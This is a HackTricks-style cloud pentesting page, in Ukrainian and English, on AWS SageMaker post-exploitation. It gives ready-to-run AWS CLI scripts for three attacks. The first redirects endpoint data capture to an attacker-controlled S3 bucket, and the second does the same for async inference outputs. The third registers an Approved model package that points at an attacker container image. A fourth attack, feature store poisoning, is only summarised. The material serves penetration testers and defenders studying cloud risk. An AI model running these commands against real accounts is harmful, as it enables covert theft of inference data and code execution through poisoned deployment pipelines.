# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker endpoint data siphon via UpdateEndpoint DataCaptureConfig

Зловживання управлінням endpoint-ами SageMaker для включення повного захоплення запитів/відповідей в attacker‑controlled S3 bucket, не торкаючись моделі чи контейнера. Використовує zero/low‑downtime rolling update і вимагає лише дозволів на управління endpoint.

### Вимоги
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (або використати існуючий bucket в тому ж account)
- Необов'язково (якщо використовується SSE‑KMS): `kms:Encrypt` на обраному CMK
- Ціль: існуючий InService real‑time endpoint в тому ж account/region

### Кроки
1) Визначте InService endpoint і зберіть поточні production variants
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) Підготуйте attacker S3 destination для captures
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) Створіть новий EndpointConfig, який зберігає ті самі варіанти, але вмикає DataCapture у bucket зловмисника

Примітка: Використовуйте явні типи вмісту, які задовольняють валідацію CLI.
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) Застосувати новий config з rolling update (minimal/no downtime)
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) Згенеруйте щонайменше один inference call (необов'язково, якщо є живий трафік)
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) Перевірити захоплення в S3 зловмисника
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### Impact
- Повна exfiltration реальних (real‑time) inference request і response payloads (та метаданих) із цільового endpoint до контрольованого атакуючим S3 bucket.
- Жодних змін до model/container image — лише endpoint‑level зміни, що дозволяють stealthy data theft шлях з мінімальними операційними порушеннями.


## SageMaker async inference output hijack via UpdateEndpoint AsyncInferenceConfig

Зловживання управлінням endpoint для перенаправлення asynchronous inference outputs до S3 bucket, контрольованого атакуючим, шляхом клонування поточного EndpointConfig і встановлення AsyncInferenceConfig.OutputConfig S3OutputPath/S3FailurePath. Це exfiltrates model predictions (та будь‑які трансформовані inputs, які додає контейнер) без модифікації model/container.

### Requirements
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: Можливість запису в attacker S3 bucket (через model execution role або permissive bucket policy)
- Target: An InService endpoint where asynchronous invocations are (or will be) used

### Steps
1) Зібрати поточні ProductionVariants з цільового endpoint
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) Створіть attacker bucket (переконайтеся, що model execution role може PutObject до нього)
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) Клонувати EndpointConfig та перехопити виводи AsyncInference у attacker bucket
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) Запустіть async invocation та перевірте, що objects потрапляють в attacker S3
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### Вплив
- Перенаправляє асинхронні результати inference (і тіла помилок) до S3 під контролем зловмисника, що дозволяє приховану ексфільтрацію прогнозів та потенційно чутливих вхідних/вихідних даних, які були pre/post-processed контейнером, без зміни model code або image і з мінімальним/без простоїв.


## SageMaker Model Registry supply-chain injection via CreateModelPackage(Approved)

Якщо зловмисник може виконати CreateModelPackage на цільовій SageMaker Model Package Group, він може зареєструвати нову версію моделі, яка вказує на container image під контролем зловмисника, і одразу позначити її як Approved. Багато CI/CD pipeline автоматично розгортають Approved версії моделей на endpoints або training jobs, що призводить до виконання коду зловмисника під ролями виконання сервісу. Cross-account exposure може посилюватися через надмірно дозволяючу політику ресурсу ModelPackageGroup.

### Вимоги
- IAM (щонайменше для скомпрометування існуючої групи): `sagemaker:CreateModelPackage` на цільовому ModelPackageGroup
- Optional (щоб створити групу, якщо її не існує): `sagemaker:CreateModelPackageGroup`
- S3: дозвіл на читання до вказаного ModelDataUrl (або розміщення артефактів під контролем зловмисника)
- Target: Model Package Group, яку downstream automation відстежує на предмет Approved версій

### Кроки
1) Set region and create/find a target Model Package Group
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) Підготуйте тестові дані моделі в S3
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) Зареєструвати шкідливу (тут нешкідливу) Approved model package version, яка посилається на публічний AWS DLC image
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) Переконайтеся, що існує нова версія Approved
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### Вплив
- Poison the Model Registry за допомогою версії Approved, яка посилається на attacker-controlled code. Pipelines, які автоматично деплоять моделі Approved, можуть завантажити та виконати attacker image, що призведе до виконання коду з правами endpoint/training roles.
- За наявності ліберальної політики ресурсу ModelPackageGroup (PutModelPackageGroupPolicy) це зловживання можна ініціювати cross-account.

## Feature store poisoning

Зловживання `sagemaker:PutRecord` для Feature Group з увімкненим OnlineStore дозволяє перезаписати live feature values, які споживаються online inference. У поєднанні з `sagemaker:GetRecord`, attacker може прочитати sensitive features. Для цього доступ до models або endpoints не потрібен.

{{#ref}}
feature-store-poisoning.md
{{/ref}}
{{#include ../../../../banners/hacktricks-training.md}}
